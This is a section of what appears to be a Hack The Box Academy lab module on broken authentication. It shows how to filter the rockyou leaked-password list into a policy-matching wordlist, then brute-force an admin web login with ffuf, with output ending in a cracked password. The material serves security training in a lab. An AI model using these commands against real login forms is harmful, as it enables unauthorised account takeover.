<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/80/section/837
// Platform Version: V1
// Module ID: 80
// Module Name: Broken Authentication
// Module Difficulty: Medium
// Section ID: 837
// Section Title: Brute-Forcing Passwords
// Page Title: Hack The Box - Academy
// Page Number: 4
-->

# Brute-Forcing Passwords

**Module Name:** Broken Authentication **Page Number:** 4

#### 

#### BROKEN AUTHENTICATION

# Brute-Forcing Passwords

## Brute-Forcing Passwords

![https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_1.png](https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_1.png)

``` shell-session
ndefstathiou@htb[/htb]$ wc -l /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

14344391 /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

``` shell-session
ndefstathiou@htb[/htb]$ grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

ndefstathiou@htb[/htb]$ wc -l custom_wordlist.txt

151647 custom_wordlist.txt
```

![https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_2.png](https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_2.png)

``` shell-session
ndefstathiou@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4764ms]
    * FUZZ: Buttercup1
```

![https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_3.png](https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_3.png)

# 

# 

#### Questions

####